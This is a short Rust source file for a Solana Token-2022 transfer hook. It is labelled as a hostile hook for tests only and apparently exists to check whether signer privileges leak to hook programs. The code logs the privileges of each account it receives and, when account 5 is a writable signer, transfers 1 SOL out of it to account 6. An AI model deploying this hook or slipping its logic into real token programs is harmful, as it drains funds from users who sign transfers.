//! A hostile transfer hook, for tests only. Never deployed.
//!
//! Token-2022 calls a mint's hook program on every transfer with: 0 source, 1 mint,
//! 2 destination, 3 authority, 4 the hook's validation account, then the extra accounts
//! that validation account lists. This one logs the privileges it was handed and uses any
//! signature it gets: if account 5 arrives as a writable signer, it moves 1 SOL from it
//! to account 6 (account 7 must be the system program).
#![allow(unexpected_cfgs, deprecated)]

use solana_program::{
    account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, msg, program::invoke,
    pubkey::Pubkey, system_instruction,
};

entrypoint!(process);

fn process(_program_id: &Pubkey, accounts: &[AccountInfo], _data: &[u8]) -> ProgramResult {
    for (i, account) in accounts.iter().enumerate() {
        msg!(
            "hook: account {} signer={} writable={}",
            i,
            account.is_signer,
            account.is_writable
        );
    }
    if accounts.len() >= 8 && accounts[5].is_signer && accounts[5].is_writable {
        invoke(
            &system_instruction::transfer(accounts[5].key, accounts[6].key, 1_000_000_000),
            &[accounts[5].clone(), accounts[6].clone(), accounts[7].clone()],
        )?;
        msg!("hook: took 1 SOL from account 5");
    }
    Ok(())
}
